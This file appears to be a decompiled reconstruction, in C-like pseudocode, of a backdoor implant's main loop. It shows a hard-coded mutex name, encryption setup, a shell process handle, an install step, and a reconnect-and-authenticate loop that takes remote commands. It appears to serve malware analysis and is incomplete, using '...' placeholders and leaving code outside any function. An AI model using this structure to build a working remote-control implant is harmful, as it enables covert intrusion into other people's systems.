#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/select.h>
#include <sys/time.h>

// .data segment
uint32_t AuthenticatedSocket = -1; // prob set to -1
char *MutexName = "vJEewiWD";

// .bss segment
char *DecryptionContext;
char *EncryptionContext;
char *InitializationVector;
FILE *TransferList[255];

pid_t SearchPId;
pid_t ShellPId;

#include "functions.h"
#include "remote_func.h"
#include "credentials.h"

int main (int argc, char **argv, char **envp) {

	char * var_c26;
	char * filename;
	int fd;
	int buf;

	// Value used to ease decompilation
	int ret;

	// Initialize S-BOX / P-BOX
	InitAESTables();

	InitTransfersList();

	ReadSettings();

	InstallHost();

	while (1) {

		if (ReadPacket(fd , buf, 4) == 4) {

			CloseSocket(fd);

			TerminateRunningOperations();

			EstablishConnectionLoop();

			SendAuthenticationPacket();

		} else {
			// If a packet is successfully read
			
			if (IsDataSizeAllowed(fd, buf) !=  0) {

				ret = ReadPacket(fd, buf, sizeof(buf));
					
				IsCommandAllowed(fd, var_c26, ret, ret);

					if (ret != 0) {
						// Here we go down the rabbit hole
						ProcessData(..., int, filename, int);
					} else {
						// leave
						cpSleep(10000);
						CloseSocket(fd);
					}
			}
		}
	}
}

if ( rcv = ReadPacket(..., ..., ...) ) {
	if ( rcv <= 3073 ) {
		if ( IsCommandAllowed(fd, ...) ) {
			ProcessData(fd, ..., ..., &filename, ...);
		} else {
			cpSleep(10000);
			CloseSocket(&fd);
		}
	}
}

CloseSocket(&fd);

TerminateRunningOperations();

do {
	fd = EstablishConnectionLoop();
	if ( !SendAuthenticationPacket(&fd) )
		cpSleep(10000);
} while ( fd == -1 )